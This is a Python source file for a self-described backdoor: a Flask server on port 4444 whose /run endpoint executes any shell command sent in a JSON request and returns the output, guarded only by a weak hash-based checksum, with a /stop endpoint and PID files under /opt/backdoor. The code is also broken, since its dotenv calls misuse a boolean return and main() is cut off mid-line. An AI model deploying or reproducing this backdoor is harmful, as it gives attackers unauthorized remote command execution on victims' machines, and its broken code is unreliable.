#!/usr/bin/env python3

import os
import socket
import subprocess
import json
import base64
import sys
import shutil
import time
import requests
import dotenv
from flask import Flask, request

# Constants

VERSION="0.0.1"
DATE="2021-09-25"
AUTHOR="Mikael Helin"

DEFAULT_PORT = 4444
DEFAULT_MAX_DELAY = 5000
CHECKSUM_KEY = dotenv.load_dotenv().get("CHECKSUM_KEY") or False
PORT = dotenv.load_dotenv().get("PORT") or DEFAULT_PORT
MAX_DELAY = dotenv.load_dotenv().get("MAX_DELAY") or DEFAULT_MAX_DELAY

PID_FILE = "/opt/backdoor/backdoor.pid"
LOCK_FILE = "/opt/backdoor/backdoor.lock"

if not CHECKSUM_KEY:
    print("No checksum key provided")
    sys.exit(1)

# Simple functions

def whoami() -> str:
    return os.popen('whoami').read()

def is_valid_timestamp(timestamp: int) -> bool:
    """Check if the timestamp is valid and within the max delay"""
    current_time = int(time.time())
    return current_time >= timestamp and current_time < timestamp + MAX_DELAY

def compute_checksum(data: dict) -> str:
    """Compute a checksum for the data, return the checksum as a string"""
    checksum_string = data["data"] + data["timestamp"] + CHECKSUM_KEY
    return str(hash(checksum_string))

def is_valid_checksum(data: dict) -> bool:
    if not data or not "data" in data or not "timestamp" in data or not "checksum" in data:
        return False
    return data["checksum"] == compute_checksum(data)

# Composite functions

def validate_request(data: dict) -> tuple[bool, str]:
    """Validate the request, return a tuple with a boolean and an error message"""
    if not "data" in data or not "timestamp" in data or not "checksum" in data:
        return False, "Invalid request"
    if not is_valid_timestamp(int(data["timestamp"])):
        return False, "Invalid timestamp"
    if not is_valid_checksum(data):
        return False, "Invalid checksum"
    return True, None

# Start Flask server

def start_server():
    app = Flask(__name__)

    @app.route("/")
    def index():
        return f"Backdoor v{VERSION} by {AUTHOR} ({DATE})"

    @app.route("/ping")
    def ping():
        return "Pong"
    
    @app.route("/stop", methods=["POST"])
    def stop():
        data = request.get_json()
        if not data:
            return "Invalid request", 400        

        # First remove PID and lock files to prevent restart
        if os.path.isfile(PID_FILE):
            os.remove(PID_FILE)
        if os.path.isfile(LOCK_FILE):
            os.remove(LOCK_FILE)
        
        shutdown = request.environ.get("werkzeug.server.shutdown")
        shutdown()
        return "Shutting down..."

    @app.route("/run", methods=["POST"])
    def backdoor():
        data = request.get_json()
        if not data:
            return "Invalid request", 400
        
        provided_checksum = request.headers.get("checksum")
        if not provided_checksum:
            return "No checksum provided", 400

        if not is_valid_timestamp(int(data["timestamp"])):
            return "Invalid timestamp", 400
        if not is_valid_checksum(data):
            return "Invalid checksum", 400
        
        command = data["data"]
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        
        response = {
            "data": output.decode(),
            "timestamp": str(int(time.time()))
        }
        response["checksum"] = compute_checksum(response)

        return json.dumps(response)

    app.run(port=PORT)



def main():
    if os.path.isfile("/opt/backdoor/

if __name__ == "__main__":
    main()